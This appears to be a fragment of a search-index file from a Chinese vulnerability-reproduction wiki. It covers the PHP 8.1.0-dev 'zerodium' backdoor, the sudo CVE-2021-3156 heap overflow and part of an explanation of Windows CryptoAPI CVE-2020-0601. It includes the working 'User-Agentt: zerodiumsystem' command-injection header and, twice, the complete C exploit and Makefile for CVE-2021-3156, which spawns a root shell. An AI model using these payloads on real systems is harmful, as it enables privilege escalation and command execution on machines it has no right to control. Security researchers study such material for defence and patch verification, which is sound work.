\u76ee\u524d\u4e3a\u6b62PHP\u5b98\u65b9\u5e76\u672a\u5c31\u8be5\u4e8b\u4ef6\u8fdb\u884c\u66f4\u591a\u62ab\u9732\uff0c\u8868\u793a\u6b64\u6b21\u670d\u52a1\u5668\u88ab\u9ed1\u7684\u5177\u4f53\u7ec6\u8282\u4ecd\u5728\u8c03\u67e5\u5f53\u4e2d\u3002\u7531\u4e8e\u6b64\u4e8b\u4ef6\u7684\u5f71\u54cd\uff0cPHP\u7684\u5b98\u65b9\u4ee3\u7801\u5e93\u5df2\u7ecf\u88ab\u7ef4\u62a4\u4eba\u5458\u8fc1\u79fb\u81f3GitHub\u5e73\u53f0\uff0c\u4e4b\u540e\u7684\u76f8\u5173\u4ee3\u7801\u66f4\u65b0\u3001\u4fee\u6539\u5c06\u4f1a\u90fd\u5728GitHub\u4e0a\u8fdb\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] PHP 8.1.0-dev","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] \"PHP/8.1.0-dev\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u540e\u95e8\u4e3a\u6dfb\u52a0\u8bf7\u6c42\u5934 User-Agentt: zerodiumsystem('id'); [!NOTE] \u662f User-Agentt \u4e0d\u662f User-Agent \u53cd\u5f39shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/","text":"Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2021\u5e741\u670826\u65e5\uff0cLinux\u5b89\u5168\u5de5\u5177sudo\u88ab\u53d1\u73b0\u4e25\u91cd\u7684\u57fa\u4e8e\u5806\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5229\u7528\u8fd9\u4e00\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u65e0\u9700\u77e5\u9053\u7528\u6237\u5bc6\u7801\uff0c\u4e00\u6837\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\uff0c\u5e76\u4e14\u662f\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u3002\u6b64\u6f0f\u6d1e\u5df2\u5206\u914d\u4e3aCVE-2021-3156\uff0c\u5371\u9669\u7b49\u7ea7\u8bc4\u5206\u4e3a7\u5206\u3002 \u5f53sudo\u901a\u8fc7-s\u6216-i\u547d\u4ee4\u884c\u9009\u9879\u5728shell\u6a21\u5f0f\u4e0b\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u5b83\u5c06\u5728\u547d\u4ee4\u53c2\u6570\u4e2d\u4f7f\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u3002\u4f46\u4f7f\u7528-s\u6216-i\u6807\u5fd7\u8fd0\u884csudoedit\u65f6\uff0c\u5b9e\u9645\u4e0a\u5e76\u672a\u8fdb\u884c\u8f6c\u4e49\uff0c\u4ece\u800c\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u56e0\u6b64\u53ea\u8981\u5b58\u5728sudoers\u6587\u4ef6\uff08\u901a\u5e38\u662f/etc/sudoers\uff09\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u666e\u901a\u7528\u6237\u5229\u7528sudo\u83b7\u5f97\u7cfb\u7edfroot\u6743\u9650\u3002\u7814\u7a76\u4eba\u5458\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u591a\u4e2aLinux\u53d1\u884c\u7248\u4e0a\u6210\u529f\u83b7\u5f97\u4e86\u5b8c\u6574\u7684root\u6743\u9650\uff0c\u5305\u62ecUbuntu 20.04\uff08sudo 1.8.31\uff09\u3001Debian 10\uff08sudo 1.8.27\uff09\u548cFedora 33\uff08sudo 1.9.2\uff09\uff0c\u5e76\u4e14sudo\u652f\u6301\u7684\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u548cLinux\u53d1\u884c\u7248\u4e5f\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 [!NOTE] \u76ee\u524dPOC\u5df2\u7ecf\u5728Github\u516c\u5f00 Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156 \u5f53\u524d\u53ef\u4ee5\u9a8c\u8bc1\u7684Linux\u73af\u5883\u4e3a Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 [!NOTE] \u8fd9\u91cc\u4f7f\u7528\u817e\u8baf\u4e91\u4e2d\u7684Ubuntu\u955c\u50cf\u8fdb\u884c\u590d\u73b0 \u4f7f\u7528\u547d\u4ee4 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u76ee\u5f55\u5df2\u7ecf\u52a0\u5165\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801 \u53e6\u4e00\u4e2a\u65e0\u4ea4\u4e92\u5f0fshell\u4f7f\u7528\u7684\u811a\u672c https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty <peter@haxx.in> ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include <stdio.h> #include <string.h> #include <stdlib.h> #include <stdint.h> #include <unistd.h> #include <ctype.h> // 512 environment variables should be enough for everyone #define MAX_ENVP 512 typedef struct { char * target_name ; char * sudoedit_path ; uint32_t smash_len_a ; uint32_t smash_len_b ; uint32_t null_stomp_len ; uint32_t lc_all_len ; } target_t ; target_t targets [] = { { . target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\" , . sudoedit_path = \"/usr/bin/sudoedit\" , . smash_len_a = 56 , . smash_len_b = 54 , . null_stomp_len = 63 , . lc_all_len = 212 }, { . target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\" , . sudoedit_path = \"/usr/bin/sudoedit\" , . smash_len_a = 64 , . smash_len_b = 49 , . null_stomp_len = 60 , . lc_all_len = 214 } }; void usage ( char * prog ) { printf ( \" usage: %s <target> \\n\\n \" , prog ); printf ( \" available targets: \\n \" ); printf ( \" ------------------------------------------------------------ \\n \" ); for ( int i = 0 ; i < sizeof ( targets ) / sizeof ( target_t ); i ++ ) { printf ( \" %d) %s \\n \" , i , targets [ i ]. target_name ); } printf ( \" ------------------------------------------------------------ \\n \" ); printf ( \" \\n \" ); } int main ( int argc , char * argv []) { printf ( \" \\n ** CVE-2021-3156 PoC by blasty <peter@haxx.in> \\n\\n \" ); if ( argc != 2 ) { usage ( argv [ 0 ]); return -1 ; } target_t * target = & targets [ atoi ( argv [ 1 ]) ]; printf ( \"using target: '%s' \\n \" , target -> target_name ); char * smash_a = calloc ( target -> smash_len_a + 2 , 1 ); char * smash_b = calloc ( target -> smash_len_b + 2 , 1 ); memset ( smash_a , 'A' , target -> smash_len_a ); memset ( smash_b , 'B' , target -> smash_len_b ); smash_a [ target -> smash_len_a ] = '\\\\' ; smash_b [ target -> smash_len_b ] = '\\\\' ; char * s_argv [] = { \"sudoedit\" , \"-s\" , smash_a , \" \\\\ \" , smash_b , NULL }; char * s_envp [ MAX_ENVP ]; int envp_pos = 0 ; for ( int i = 0 ; i < target -> null_stomp_len ; i ++ ) { s_envp [ envp_pos ++ ] = \" \\\\ \" ; } s_envp [ envp_pos ++ ] = \"X/P0P_SH3LLZ_\" ; char * lc_all = calloc ( target -> lc_all_len + 16 , 1 ); strcpy ( lc_all , \"LC_ALL=C.UTF-8@\" ); memset ( lc_all + 15 , 'C' , target -> lc_all_len ); s_envp [ envp_pos ++ ] = lc_all ; s_envp [ envp_pos ++ ] = NULL ; printf ( \"** pray for your rootshell.. ** \\n \" ); execve ( target -> sudoedit_path , s_argv , s_envp ); return 0 ; } lib.c #include <unistd.h> #include <stdio.h> #include <stdlib.h> #include <string.h> static void __attribute__ (( constructor )) _init ( void ); static void _init ( void ) { printf ( \"[+] bl1ng bl1ng! We got it! \\n \" ); setuid ( 0 ); seteuid ( 0 ); setgid ( 0 ); setegid ( 0 ); static char * a_argv [] = { \"sh\" , NULL }; static char * a_envp [] = { \"PATH=/bin:/usr/bin:/sbin\" , NULL }; execv ( \"/bin/sh\" , a_argv ); }","title":"Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#linux-sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e-cve-2021-3156","text":"","title":"Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2021\u5e741\u670826\u65e5\uff0cLinux\u5b89\u5168\u5de5\u5177sudo\u88ab\u53d1\u73b0\u4e25\u91cd\u7684\u57fa\u4e8e\u5806\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5229\u7528\u8fd9\u4e00\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u65e0\u9700\u77e5\u9053\u7528\u6237\u5bc6\u7801\uff0c\u4e00\u6837\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\uff0c\u5e76\u4e14\u662f\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u3002\u6b64\u6f0f\u6d1e\u5df2\u5206\u914d\u4e3aCVE-2021-3156\uff0c\u5371\u9669\u7b49\u7ea7\u8bc4\u5206\u4e3a7\u5206\u3002 \u5f53sudo\u901a\u8fc7-s\u6216-i\u547d\u4ee4\u884c\u9009\u9879\u5728shell\u6a21\u5f0f\u4e0b\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u5b83\u5c06\u5728\u547d\u4ee4\u53c2\u6570\u4e2d\u4f7f\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u3002\u4f46\u4f7f\u7528-s\u6216-i\u6807\u5fd7\u8fd0\u884csudoedit\u65f6\uff0c\u5b9e\u9645\u4e0a\u5e76\u672a\u8fdb\u884c\u8f6c\u4e49\uff0c\u4ece\u800c\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u56e0\u6b64\u53ea\u8981\u5b58\u5728sudoers\u6587\u4ef6\uff08\u901a\u5e38\u662f/etc/sudoers\uff09\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u666e\u901a\u7528\u6237\u5229\u7528sudo\u83b7\u5f97\u7cfb\u7edfroot\u6743\u9650\u3002\u7814\u7a76\u4eba\u5458\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u591a\u4e2aLinux\u53d1\u884c\u7248\u4e0a\u6210\u529f\u83b7\u5f97\u4e86\u5b8c\u6574\u7684root\u6743\u9650\uff0c\u5305\u62ecUbuntu 20.04\uff08sudo 1.8.31\uff09\u3001Debian 10\uff08sudo 1.8.27\uff09\u548cFedora 33\uff08sudo 1.9.2\uff09\uff0c\u5e76\u4e14sudo\u652f\u6301\u7684\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u548cLinux\u53d1\u884c\u7248\u4e5f\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#\u6f0f\u6d1e\u5f71\u54cd","text":"Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#\u6f0f\u6d1e\u590d\u73b0","text":"[!NOTE] \u76ee\u524dPOC\u5df2\u7ecf\u5728Github\u516c\u5f00 Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156 \u5f53\u524d\u53ef\u4ee5\u9a8c\u8bc1\u7684Linux\u73af\u5883\u4e3a Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 [!NOTE] \u8fd9\u91cc\u4f7f\u7528\u817e\u8baf\u4e91\u4e2d\u7684Ubuntu\u955c\u50cf\u8fdb\u884c\u590d\u73b0 \u4f7f\u7528\u547d\u4ee4","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u76ee\u5f55\u5df2\u7ecf\u52a0\u5165\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801 \u53e6\u4e00\u4e2a\u65e0\u4ea4\u4e92\u5f0fshell\u4f7f\u7528\u7684\u811a\u672c https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty <peter@haxx.in> ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include <stdio.h> #include <string.h> #include <stdlib.h> #include <stdint.h> #include <unistd.h> #include <ctype.h> // 512 environment variables should be enough for everyone #define MAX_ENVP 512 typedef struct { char * target_name ; char * sudoedit_path ; uint32_t smash_len_a ; uint32_t smash_len_b ; uint32_t null_stomp_len ; uint32_t lc_all_len ; } target_t ; target_t targets [] = { { . target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\" , . sudoedit_path = \"/usr/bin/sudoedit\" , . smash_len_a = 56 , . smash_len_b = 54 , . null_stomp_len = 63 , . lc_all_len = 212 }, { . target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\" , . sudoedit_path = \"/usr/bin/sudoedit\" , . smash_len_a = 64 , . smash_len_b = 49 , . null_stomp_len = 60 , . lc_all_len = 214 } }; void usage ( char * prog ) { printf ( \" usage: %s <target> \\n\\n \" , prog ); printf ( \" available targets: \\n \" ); printf ( \" ------------------------------------------------------------ \\n \" ); for ( int i = 0 ; i < sizeof ( targets ) / sizeof ( target_t ); i ++ ) { printf ( \" %d) %s \\n \" , i , targets [ i ]. target_name ); } printf ( \" ------------------------------------------------------------ \\n \" ); printf ( \" \\n \" ); } int main ( int argc , char * argv []) { printf ( \" \\n ** CVE-2021-3156 PoC by blasty <peter@haxx.in> \\n\\n \" ); if ( argc != 2 ) { usage ( argv [ 0 ]); return -1 ; } target_t * target = & targets [ atoi ( argv [ 1 ]) ]; printf ( \"using target: '%s' \\n \" , target -> target_name ); char * smash_a = calloc ( target -> smash_len_a + 2 , 1 ); char * smash_b = calloc ( target -> smash_len_b + 2 , 1 ); memset ( smash_a , 'A' , target -> smash_len_a ); memset ( smash_b , 'B' , target -> smash_len_b ); smash_a [ target -> smash_len_a ] = '\\\\' ; smash_b [ target -> smash_len_b ] = '\\\\' ; char * s_argv [] = { \"sudoedit\" , \"-s\" , smash_a , \" \\\\ \" , smash_b , NULL }; char * s_envp [ MAX_ENVP ]; int envp_pos = 0 ; for ( int i = 0 ; i < target -> null_stomp_len ; i ++ ) { s_envp [ envp_pos ++ ] = \" \\\\ \" ; } s_envp [ envp_pos ++ ] = \"X/P0P_SH3LLZ_\" ; char * lc_all = calloc ( target -> lc_all_len + 16 , 1 ); strcpy ( lc_all , \"LC_ALL=C.UTF-8@\" ); memset ( lc_all + 15 , 'C' , target -> lc_all_len ); s_envp [ envp_pos ++ ] = lc_all ; s_envp [ envp_pos ++ ] = NULL ; printf ( \"** pray for your rootshell.. ** \\n \" ); execve ( target -> sudoedit_path , s_argv , s_envp ); return 0 ; } lib.c #include <unistd.h> #include <stdio.h> #include <stdlib.h> #include <string.h> static void __attribute__ (( constructor )) _init ( void ); static void _init ( void ) { printf ( \"[+] bl1ng bl1ng! We got it! \\n \" ); setuid ( 0 ); seteuid ( 0 ); setgid ( 0 ); setegid ( 0 ); static char * a_argv [] = { \"sh\" , NULL }; static char * a_envp [] = { \"PATH=/bin:/usr/bin:/sbin\" , NULL }; execv ( \"/bin/sh\" , a_argv ); }","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/","text":"Windows CryptoAPI\u6b3a\u9a97\u6f0f\u6d1e CVE-2020-0601 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 1\u670815\u65e5\uff0c\u5fae\u8f6f\u53d1\u5e03\u4e86\u9488\u5bf9CVE-2020-0601\u7684\u5b89\u5168\u8865\u4e01\uff0c\u8be5\u6f0f\u6d1e\u662f\u5fae\u8f6f\u5728\u5b9e\u73b0\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u6570\u5b57\u8bc1\u4e66\u9a8c\u8bc1\u65f6\u4ea7\u751f\uff0c\u53ef\u88ab\u5229\u7528\u4e8e\u4f2a\u9020\u6765\u81ea\u53ef\u4fe1\u4efb\u6765\u6e90\u7684\u7b7e\u540d\u6216\u8bc1\u4e66\uff0c\u5e76\u4e14\u56e0\u5176\u4e1a\u52a1\u7279\u6027\u4f1a\u884d\u751f\u51fa\u591a\u79cd\u653b\u51fb\u5411\u91cf\uff0c\u5177\u6709\u6781\u9ad8\u7684\u53ef\u5229\u7528\u4ef7\u503c\u548c\u6781\u5927\u7684\u6f5c\u5728\u7834\u574f\u529b\uff0cWin 10\u548cwindows server 2016 & 2019\u4e5f\u90fd\u5728\u5176\u5f71\u54cd\u8303\u56f4\u5185\u3002\u8be5\u6f0f\u6d1e\u7531\u7f8e\u56fdNSA\u56fd\u5bb6\u5b89\u5168\u5c40\u53d1\u73b0\u540e\u6c47\u62a5\u7ed9\u5fae\u8f6f\u516c\u53f8\uff0c\u4e5f\u88ab\u8ba4\u4e3a\u662f\u7b2c\u4e00\u4e2aNSA\u516c\u5f00\u62ab\u9732\u7684\u8f6f\u4ef6\u7cfb\u7edf\u6f0f\u6d1e\uff0c\u5f53\u7136\u4e5f\u6709\u53ef\u80fd\u5b58\u5728\u5176\u7279\u6b8a\u7684\u6218\u672f\u76ee\u7684\u3002\u7eff\u76df\u79d1\u6280M01N\u653b\u51fb\u5b89\u5168\u7814\u7a76\u56e2\u961f\u5bf9\u6b64\u6f0f\u6d1e\u539f\u7406\u8fdb\u884c\u4e86\u8be6\u7ec6\u5206\u6790\u5e76\u590d\u73b0\u4e86\u591a\u79cd\u53ef\u80fd\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u63d0\u51fa\u4e86\u8be6\u7ec6\u7684\u68c0\u6d4b\u53ca\u6574\u6539\u65b9\u6848\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u5e26\u6709\u6307\u5b9a\u53c2\u6570\u7684ECC\u5bc6\u94a5\u7684\u8bc1\u4e66\u7684Microsoft Windows\u7248\u672c \u4f9d\u8d56\u4e8eWindows CryptoAPI\u7684\u5e94\u7528\u7a0b\u5e8f \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u539f\u7406 \u00b6 CVE-2020-0601\u7684\u6839\u6e90\u662f\u5fae\u8f6f\u7684\u52a0\u5bc6\u5e93crypt32.dll\u4e2d\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u5b9e\u73b0\u95ee\u9898\uff0c\u9996\u5148\u6211\u4eec\u6765\u4e86\u89e3\u4e00\u4e0b\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u57fa\u672c\u539f\u7406\u3002 \u8981\u5f62\u8c61\u5730\u7406\u89e3\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff0c\u53ef\u4ee5\u7ed3\u5408\u56fe\u5f62\u6765\u770b\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u7b26\u5408\u692d\u5706\u66f2\u7ebf\u7684\u65b9\u7a0by2 = x3 + ax + b\uff0c\u56fe\u50cf\u5982\u4e0b\uff1a \u692d\u5706\u66f2\u7ebf\u5177\u6709\u7684\u4e00\u4e9b\u72ec\u7279\u7684\u6027\u8d28\u4f7f\u5b83\u9002\u5408\u7528\u4e8e\u52a0\u5bc6\u7b97\u6cd5\uff1a \u692d\u5706\u66f2\u7ebf\u5173\u4e8ex\u8f74\u5bf9\u79f0 \u4efb\u4f55\u4e00\u6761\u975e\u5782\u76f4\u7684\u7ebf\u4e0e\u66f2\u7ebf\u6700\u591a\u6709\u4e09\u4e2a\u70b9\u76f8\u4ea4 \u66f2\u7ebf\u662f\u5149\u6ed1\u7684\uff0c\u5373\u66f2\u7ebf\u7684\u6240\u6709\u70b9\u90fd\u6ca1\u6709\u4e24\u4e2a\u6216\u8005\u4e24\u4e2a\u4ee5\u4e0a\u7684\u4e0d\u540c\u7684\u5207\u7ebf \u5728\u692d\u5706\u66f2\u7ebf\u4e0a\u4efb\u610f\u4e24\u70b9A\u3001B\uff08\u82e5A\u3001B\u91cd\u5408\u5219\u4f5cA\u7684\u5207\u7ebf\uff09\uff0c\u4f5c\u76f4\u7ebf\u4ea4\u4e8e\u692d\u5706\u66f2\u7ebf\u53e6\u4e00\u70b9C \uff0c\u8fc7C \u505ay\u8f74\u7684\u5e73\u884c\u7ebf\u4e0e\u692d\u5706\u66f2\u7ebf\u4ea4\u4e8eC\u70b9\uff0c\u5b9a\u4e49A+B=C\u3002\u692d\u5706\u66f2\u7ebf\u7684\u52a0\u6cd5\u7b26\u5408\u4ea4\u6362\u5f8b\u548c\u7ed3\u5408\u5f8b\u3002 \u5982\u679cA\u3001B\u662f\u540c\u4e00\u4e2a\u70b9\uff0c\u5219\u8fc7A\u4f5c\u692d\u5706\u66f2\u7ebf\u7684\u5207\u7ebf\uff0c\u4ee5\u540c\u6837\u7684\u65b9\u6cd5\u5f97\u5230\u5bf9\u5e94\u7684\u7ed3\u679c C=2A \u3002 \u63a5\u4e0b\u6765\u662f\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u76f8\u5173\u7684\u91cd\u70b9\uff0c\u5982\u679c\u5bf9\u591a\u4e2aA\u8fdb\u884c\u7d2f\u52a0,\u5219\u53ef\u4f9d\u6b21\u7d2f\u52a0\u8fde\u7ebf\u5f97\u5230nA\u7684\u503c \u3002 \u8d77\u70b9\u4e3aA\uff0c\u7ec8\u70b9D=3A\uff0c\u9636\u4e3a3 \u3002 \u8d77\u70b9\u4e3aA\uff0c\u7ec8\u70b9G=4A\uff0c\u9636\u4e3a4\u3002 \u692d\u5706\u66f2\u7ebf\u52a0\u5bc6 \u8003\u8651K=kG\uff0c\u5176\u4e2dK\u3001G\u4e3a\u692d\u5706\u66f2\u7ebfEp(a,b)\u4e0a\u7684\u70b9\uff0cn\u4e3aG\u7684\u9636\u3002k\u4e3a\u5c0f\u4e8en\u7684\u6574\u6570\u3002\u5219\u7ed9\u5b9ak\u548cG\uff0c\u6839\u636e\u52a0\u6cd5\u6cd5\u5219\uff0c\u8ba1\u7b97K\u5f88\u5bb9\u6613\uff08\u53ea\u8981\u9010\u6b21\u6c42\u89e3\uff09\u4f46\u53cd\u8fc7\u6765\uff0c\u7ed9\u5b9aK\u548cG\uff0c\u6c42k\u5c31\u975e\u5e38\u56f0\u96be\u3002\u56e0\u4e3a\u5b9e\u9645\u4f7f\u7528\u4e2d\u7684ECC\u539f\u5219\u4e0a\u628a\u79c1\u94a5k\u53d6\u5f97\u76f8\u5f53\u5927\uff0cn\u4e5f\u76f8\u5f53\u5927\uff0c\u4e14\u692d\u5706\u66f2\u7ebf\u4e0d\u518d\u8fde\u7eed\u800c\u662f\u5728\u5b9e\u6570\u5185\u79bb\u6563\u7684\u503c\uff0c\u8981\u628an\u4e2a\u89e3\u70b9\u9010\u4e00\u7b97\u51fa\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\u3002\u8fd9\u5c31\u662f\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u6570\u5b66\u4f9d\u636e \u3002 \u70b9G\u79f0\u4e3a\u57fa\u70b9 k(k<n)\u4e3a\u79c1\u6709\u5bc6\u94a5 K\u4e3a\u516c\u5f00\u5bc6\u94a5 \u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff08ECC\uff09\u548cRSA\u4e00\u6837\u662f\u4e00\u79cd\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\uff0c\u5bf9\u539f\u59cb\u6570\u636e\u4ee5\u516c\u94a5\u52a0\u5bc6\uff0c\u4ee5\u79c1\u94a5\u89e3\u5bc6\uff0c\u5373\u4fbf\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u6587\u548c\u516c\u94a5\u4e5f\u65e0\u6cd5\uff08\u5728\u5408\u7406\u7684\u65f6\u95f4\u6216\u4ee3\u4ef7\u4e0b\uff09\u89e3\u5bc6\u83b7\u53d6\u660e\u6587\u3002 \u540c\u6837\u7684\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff08ECC\uff09\u4e5f\u88ab\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\uff0c\u4ee5\u79c1\u94a5\u52a0\u5bc6\u751f\u6210\u7b7e\u540d\uff0c\u4ee5\u516c\u94a5\u89e3\u5bc6\u9a8c\u8bc1\u7b7e\u540d\uff0c\u5982\u679c\u548c\u539f\u6587\u4e00\u6837\u5219\u7b7e\u540d\u9a8c\u8bc1\u6210\u529f\u3002 